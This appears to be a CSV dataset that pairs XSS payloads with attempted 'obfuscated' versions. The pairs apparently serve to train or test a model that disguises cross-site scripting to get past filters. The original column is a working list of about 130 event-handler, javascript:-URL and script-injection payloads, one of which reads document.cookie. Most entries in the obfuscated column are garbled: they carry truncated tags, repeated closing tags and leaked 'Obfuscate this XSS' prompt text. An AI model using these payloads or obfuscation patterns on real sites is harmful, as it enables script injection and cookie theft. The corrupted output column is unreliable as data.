original,ofuscado
<link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>,/link>input autofocus>
<command onpointerleave=alert(1)>xss</command>,and XSS: command onpointerleave=alert(1)>xss/command>
"<thead onkeydown=""alert(1)"" contenteditable>test</thead>","this XSS: thead onkeydown=""alert(1)"" contenteditable>test/thead>"
<abbr onpointermove=alert(1)>xss</abbr>,this XSS: abbr onpointermove=alert(1)>xss/abbr>
<strong onfocusout=alert(1) tabindex=1 id=x></strong><input autofocus>,/strong>input autofocus>
<details id=x tabindex=1 onbeforeactivate=alert(1)></details>,?=x tabindex=1 onbeforeactivate=alert(1)>/details>/details>.
"<dd draggable=""true"" ondragstart=""alert(1)"">test</dd>",": dd draggable=""true"" ondragstart=""alert(1)"">test/dd>"
"<div draggable=""true"" contenteditable>drag me</div><select ondragover=alert(1) contenteditable>drop here</select>",.com/doc.html Contenteditable>drag me/div>select ondragover=alert(1) contenteditable>drop here/select>
"<strike onmouseenter=""alert(1)"">test</strike>","er=""alert(1)"">test/strike>"
<title onpointerenter=alert(1)>xss</title>,/title>erenter=alert(1)>xss/title> the following XSS: title onpointerenter=alert(1)>xss/title>
<frameset onpointerup=alert(1)>xss</frameset>,XSS: frameset onpointerup=alert(1)>xss/frameset>
<svg><blockquote onload=alert(1)></blockquote>,: svg>blockquote onload=alert(1)>/blockquote>
"<menu ondblclick=""alert(1)"">test</menu>","with menu ondblclick=""alert(1)"">test/menu>"
<hgroup id=x tabindex=1 onfocusin=alert(1)></hgroup>,Obfuscate thisXSS: hgroup id=x tabindex=1 onfocusin=alert(1)>/hgroup>
<area id=x tabindex=1 onactivate=alert(1)></area>,XSS: area id=x tabindex=1 onactivate=alert(1)>/area>
<hr onpointerout=alert(1)>xss</hr>,XSS: hr onpointerout=alert(1)>xss/hr>
<var onpointerleave=alert(1)>xss</var>,or/var>>var onpointerleave=alert(1)>xss/var>
"<dfn onmouseenter=""alert(1)"">test</dfn>",": dfn onmouseenter=""alert(1)"">test/dfn>"
"<style>:target {transform: rotate(180deg);}</style><dir id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></dir>","id=x style=""transition:transform 2s"" ontransitionrun=alert(1)>/dir>/dir>/dir>/dir> id=x style=""transition:transform 2s"" ontransitionrun=alert(1)>/dir>/dir>/dir>/dir>dir>dir>/dir> id=x style=""transition:transform 2s"""
"<dl onbeforecopy=""alert(1)"" contenteditable>test</dl>","dl onbeforecopy=""alert(1)"" contenteditable>test/dl>"
"<param onmousemove=""alert(1)"">test</param>",>t/param>
<var onpointerup=alert(1)>xss</var>,. XS: var onpointerup=alert(1)>xss/var>
"<bdi onmousedown=""alert(1)"">test</bdi>",": bdi onmousedown=""alert(1)"">test/bdi>"
"<rb draggable=""true"" ondragleave=""alert(1)"">test</rb>",/rb>-test/rb>-test/rb> >test/rb>>>test/rb>
"<data draggable=""true"" ondragenter=""alert(1)"">test</data>",": data draggable=""true"" ondragenter=""alert(1)"">test/data>"
<mark id=x tabindex=1 ondeactivate=alert(1)></mark><input id=y autofocus>,mark id=x tabindex=1 ondeactivate=alert(1)>/mark>input id=y autofocus>
"<style>:target {transform: rotate(180deg);}</style><param id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></param>",">param id=x style=""transition:transform 2s"" ontransitionrun=alert(1)>/param>"
<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>,/link>sinput autofocus>x: link onblur=alert(1) tabindex=1 id=x>/link>input autofocus>
<svg><legend onload=alert(1)></legend>,", and it's the problem: svg>legend onload=alert(1)>/legend>"
"<style>:target {color:red;}</style><textarea id=x style=""transition:color 1s"" ontransitionend=alert(1)></textarea>",": ""color 1s"" ontransitionend=alert(1)>/textarea>"
<object onpointerleave=alert(1)>xss</object>,_objects/object>: object onpointerleave=alert(1)>xss/object>
<basefont onfocusout=alert(1) tabindex=1 id=x></basefont><input autofocus>,/basefont>input autofocus>
"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></kbd>",": style=""transition:transform 2s"" ontransitionrun=alert(1)>/kbd>"
"<tt onkeypress=""alert(1)"" contenteditable>test</tt>",...
[1].find(alert),Obfuscate this ExSS: [1].find(alert)
<time onblur=alert(1) tabindex=1 id=x></time><input autofocus>,/time>input autofocus>
"<div draggable=""true"" contenteditable>drag me</div><template ondrop=alert(1) contenteditable>drop here</template>","XSS: div draggable=""true"" contenteditable>drag me/div>template ondrop=alert(1) contenteditable>drop here/template>"
<object onpointerup=alert(1)>xss</object>,Obfuscate this XSS: object onpointerup=alert(1)>xss/object>
<svg><menu onload=alert(1)></menu>,/menu>.
"<rt draggable=""true"" ondragenter=""alert(1)"">test</rt>","XSS XSS: rt draggable=""true"" ondragenter=""alert(1)"">test/rt>"
<rtc onfocusout=alert(1) tabindex=1 id=x></rtc><input autofocus>,rtc onfocusout=alert(1) tabindex=1 id=x>/rtc>input autofocus>
"<pre onmouseleave=""alert(1)"">test</pre>",", pre onmouseleave=""alert(1)"">test/pre>"
<col id=x tabindex=1 onactivate=alert(1)></col>,col id=x tabindex=1 onactivate=alert(1)>/col>
<p id=x tabindex=1 onfocusin=alert(1)></p>,p id=x tabindex=1 onfocusin=alert(1)>/p>
"<div draggable=""true"" contenteditable>drag me</div><samp ondragover=alert(1) contenteditable>drop here</samp>","e>div draggable=""true"" contenteditable>drag me/div>samp ondragover=alert(1) contenteditable>drop here/samp>"
"<nextid onclick=""alert(1)"">test</nextid>","for this XSS: nextid onclick=""alert(1)"">test/nextid>"
"<ins onkeyup=""alert(1)"" contenteditable>test</ins>","=""alert(1)"" contenteditable>test/ins> XSS: ins onkeyup=""alert(1)"" contenteditable>test/ins>"
"<style>@keyframes x{}</style><ins style=""animation-name:x"" onanimationstart=""alert(1)""></ins>",": style>@keyframes x/style>ins style=""animation-name:x"" onanimationstart=""alert(1)"">/ins>/ins>"
"<dl onmouseout=""alert(1)"">test</dl>","dl onmouseout=""alert(1)"">test/dl>"
"<command onmouseleave=""alert(1)"">test</command>",": command onmouseleave=""alert(1)"">test/command>"
"<input value = """" type = text>",": diabyte value = """" type = text>"
<h1 id=x tabindex=1 onactivate=alert(1)></h1>,()>/h1>.
"<form onmousedown=""alert(1)"">test</form>","form onmousedown=""alert(1)"">test/form>"
"<spacer draggable=""true"" ondrag=""alert(1)"">test</spacer>",": spacer draggable=""true"" ondrag=""alert(1)"">test/spacer>"
"<em onclick=""alert(1)"">test</em>","Obfuscate this XSS: em onclick=""alert(1)"">test/em>"
"<style>@keyframes x{}</style><rtc style=""animation-name:x"" onanimationend=""alert(1)""></rtc>",":rtc style=""animation-name:x"" onanimationend=""alert(1)"">/rtc>"
<bgsound id=x tabindex=1 ondeactivate=alert(1)></bgsound><input id=y autofocus>,XSS/bgsound>input id=y autofocus>
"<marquee onkeyup=""alert(1)"" contenteditable>test</marquee>","the XSS: marquee onkeyup=""alert(1)"" contenteditable>test/marquee>"
"<div draggable=""true"" contenteditable>drag me</div><embed ondragover=alert(1) contenteditable>drop here</embed>","this XSS: this XSS: div draggable=""true"" contenteditable>drag me/div>embed ondragover=alert(1) contenteditable>drop here/embed>"
"<code onmouseout=""alert(1)"">test</code>","this XSS: code onmouseout=""alert(1)"">test/code>"
<option onpointerout=alert(1)>xss</option>,obfuscate this XSS: option onpointerout=alert(1)>xss/option>.
<rt onpointerout=alert(1)>xss</rt>,Obfuscate this XSS: rt onpointerout=alert(1)>xss/rt>
"<q onmouseenter=""alert(1)"">test</q>","q onmouseenter=""alert(1)"">test/q>"
"<element onbeforecopy=""alert(1)"" contenteditable>test</element>","element onbeforecopy=""alert(1)"" contenteditable>test/element>"
"<style>@keyframes x{}</style><main style=""animation-name:x"" onanimationend=""alert(1)""></main>",">/main style=""animation-name:x"" onanimationend=""alert(1)"">/main>/main>>/main>"
<base id=x tabindex=1 onfocusin=alert(1)></base>,>/base>
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><acronym id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></acronym>",":-style>@keyframes xfrom left:0;to left: 1000px;:target animation:10s ease-in-out 0s 1 x;/style>acronym id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/acronym>/acronym>/acronym>/acronym>"
"<b onmouseout=""alert(1)"">test</b>","b onmouseout=""alert(1)"">test/b>"
"<acronym draggable=""true"" ondrag=""alert(1)"">test</acronym>",": acronym draggable=""true"" ondrag=""alert(1)"">test/acronym>"
"<small draggable=""true"" ondragend=""alert(1)"">test</small>",>test>test/small>
<ul onpointermove=alert(1)>xss</ul>,this XSS: ul onpointermove=alert(1)>xss/ul>
<ol onpointerenter=alert(1)>xss</ol>,the XSS: ol onpointerenter=alert(1)>xss/ol>.
"<link onbeforecopy=""alert(1)"" contenteditable>test</link>",/link>
"<html onbeforecut=""alert(1)"" contenteditable>test</html>",>test/html>
"<video autoplay controls onseeking=alert(1)><source src=""validvideo.mp4"" type=""video/mp4""></video>","= 128-3323source src=""validvideo.mp4"" type=""video/mp4"">/video>"
"<i onmouseup=""alert(1)"">test</i>","— i onmouseup=""alert(1)"">test/i>"
<title onpointerup=alert(1)>xss</title>,: title onpointerup=alert(1)>xss/title>
<select onchange=alert(1)><option>change me</option><option>xss</option></select>,/option>option>xss/option>/select>/select>/select>/select>/select> /select>/select>>/select>/select>/select>/select>/select>/select>/select>/select>>xss/
"<style>@keyframes slidein {}</style><dialog style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dialog>",": style>@keyframes slidein /style>dialog style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">/dialog>/dialog>/dialog>alert(1)/-dialog>/dialog> /dialog>d"
"<del onbeforepaste=""alert(1)"" contenteditable>test</del>",": del onbeforepaste=""alert(1)"" contenteditable>test/del>"
"<style>:target {color:red;}</style><b id=x style=""transition:color 1s"" ontransitionend=alert(1)></b>","x style=""transition:color 1s"" ontransitionend=alert(1)>/b>"
<textarea autofocus onfocus=alert(1)>test</textarea>,XSS: textarea autofocus onfocus=alert(1)>test/textarea>
"<bdo ondblclick=""alert(1)"">test</bdo>","Obfuscate thisXSS: bdo ondblclick=""alert(1)"">test/bdo>"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><thead id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></thead>","if id=x style=""position:absolute;"" style=""position:absolute;"" onanimationcancel=""alert(1)"">/thead> id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/thead> js=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/thead> s/thead> xfrom "
<dfn onblur=alert(1) tabindex=1 id=x></dfn><input autofocus>,XSS: dfn onblur=alert(1) tabindex=1 id=x>/dfn>input autofocus>
<section id=x tabindex=1 onfocus=alert(1)></section>,: section id=x tabindex=1 onfocus=alert(1)>/section>
<details ontoggle=alert(1) open>test</details>,XSS: details ontoggle=alert(1) open>test/details> Obfuscate thisXSS: details ontoggle=alert(1) open>test/details>
<element onpointerleave=alert(1)>xss</element>,:=alert(1)>xss/element> this XSS:element onpointerleave=alert(1)>xss/element>
<form onpointerenter=alert(1)>xss</form>,XSS: form onpointerenter=alert(1)>xss/form>
<optgroup onpointerout=alert(1)>xss</optgroup>,=alert(1)>xss/optgroup>.
"<style>:target {color:red;}</style><u id=x style=""transition:color 1s"" ontransitionend=alert(1)></u>",". id=x style=""transition:color 1s"" ontransitionend=alert(1)>/u>"
<button onfocusout=alert(1) id=x></button><input autofocus>,-button onfocusout=alert(1) id=x>/button>input autofocus>
<small id=x tabindex=1 onactivate=alert(1)></small>,is not a good method to re-start the XSS.
<video id=x tabindex=1 onbeforeactivate=alert(1)></video>,>/video>
"<video onbeforepaste=""alert(1)"" contenteditable>test</video>",": video onbeforepaste=""alert(1)"" contenteditable>test/video>"
"<style>@keyframes x{}</style><rb style=""animation-name:x"" onanimationend=""alert(1)""></rb>","style=""animation-name:x"" onanimationend=""alert(1)"">/rb>/rb>"
"<rtc oncontextmenu=""alert(1)"">test</rtc>","XSS: rtc oncontextmenu=""alert(1)"">test/rtc>"
<nextid onpointermove=alert(1)>xss</nextid>,: nextid onpointermove=alert(1)>xss/nextid>
<discard onpointerenter=alert(1)>xss</discard>,: discard onpointerenter=alert(1)>xss/discard>
<kbd onfocusout=alert(1) tabindex=1 id=x></kbd><input autofocus>,kbd onfocusout=alert(1) tabindex=1 id=x>/kbd>input autofocus>
"<rp onmousemove=""alert(1)"">test</rp>",": rp onmousemove=""alert(1)"">test/rp>"
"<image onmouseup=""alert(1)"">test</image>",""">test/image>>"
"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationend=""alert(1)""></address>",":t this xSS: style>@keyframes x/style>address style=""animation-name:x"" onanimationend=""alert(1)"">/address>"
<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>,to XSS: a id=x tabindex=1 ondeactivate=alert(1)>/a>input id=y autofocus>
<dt onfocusout=alert(1) tabindex=1 id=x></dt><input autofocus>,>/dt>input autofocus> xbl=input autofocus> xbl=/dt>
"<textarea onkeypress=""alert(1)"" contenteditable>test</textarea>","ast(1)"" contenteditable>test/textarea>"
"<template onmouseout=""alert(1)"">test</template>","XSS: template onmouseout=""alert(1)"">test/template>"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></area>","style>@keyframes xfrom left:0;to left: 1000px;:target animation:10s ease-in-out 0s 1 x;/style>area id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/area>/area>/area>/area>/area>/area>/area>/area>"
"<footer onmouseenter=""alert(1)"">test</footer>","this XSS: footer onmouseenter=""alert(1)"">test/footer>"
"<canvas onbeforecopy=""alert(1)"" contenteditable>test</canvas>",": canvas onbeforecopy=""alert(1)"" contenteditable>test/canvas>"
"<rt onbeforepaste=""alert(1)"" contenteditable>test</rt>","=""alert(1)"" contenteditable>test/rt>"
"<style>:target {transform: rotate(180deg);}</style><code id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></code>","=""transition:transform 2s"" ontransitionrun=alert(1)>/code>/code>/code>/code>/code>code id=x style=""transition:transform 2s"" ontransitionrun=alert(1)>/code>/code>/code>/code>/code>/code>/code>/code>/code>/code>/code>/"
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>clickme,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>clickme
<dd id=x tabindex=1 onfocus=alert(1)></dd>,: dd id=x tabindex=1 onfocus=alert(1)>/dd>
"<b draggable=""true"" ondragstart=""alert(1)"">test</b>",>test/b>
document.documenturi,Obfuscate thisXSS: document.documenturi
set.constructor`alert\x28document.domain\x29```,x29document.domainx29
"<nobr oncontextmenu=""alert(1)"">test</nobr>","XSS: nobr oncontextmenu=""alert(1)"">test/nobr>"
<center onpointerdown=alert(1)>xss</center>,XSS: center onpointerdown=alert(1)>xss/center>
"<style>:target {transform: rotate(180deg);}</style><applet id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></applet>","tr=x style=""transition:transform 2s"" ontransitionrun=alert(1)>/applet>"
"src=# onmouseover=""alert(document.cookie)","XSS: src=# onmouseover=""alert(document.cookie)"
<command id=x tabindex=1 ondeactivate=alert(1)></command><input id=y autofocus>,/command>input id=y autofocus>
"<applet onkeydown=""alert(1)"" contenteditable>test</applet>",": applet onkeydown=""alert(1)"" contenteditable>test/applet>"
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></details>","_form animation:10s ease-in-out 0s 1 x;/style>details id=x style=""position:absolute;"" style=""alert(1)"">/details>/details id=x style=""position:absolute;"" onanimationcancel=""alert(1)"">/details>/details>details>/details>"
"<div draggable=""true"" contenteditable>drag me</div><acronym ondrop=alert(1) contenteditable>drop here</acronym>","div draggable=""true"" contenteditable>drag me/div>acronym ondrop=alert(1) contenteditable>drop here/acronym>"
"<td onbeforecopy=""alert(1)"" contenteditable>test</td>","/td> and td onbeforecopy=""alert(1)"" contenteditable>test/td>"
"<param onbeforecopy=""alert(1)"" contenteditable>test</param>","param onbeforecopy=""alert(1)"" contenteditable>test/param>"
"<script>document.write(""<scri"");</script>pt src=""httx://.rocks/.js""></script>","? XSS:-document.write(""scri"");/script>pt src=""httx://.rocks/.js"">/script>pt src=""httx://.rocks/.js"">/script>pt src=""httx://.rocks/.js"">/script>pt src=""httx://.rock"
"<table onkeyup=""alert(1)"" contenteditable>test</table>",": table onkeyup=""alert(1)"" contenteditable>test/table>"
"<a draggable=""true"" ondragleave=""alert(1)"">test</a>",": a draggable=""true"" ondragleave=""alert(1)"">test/a>"
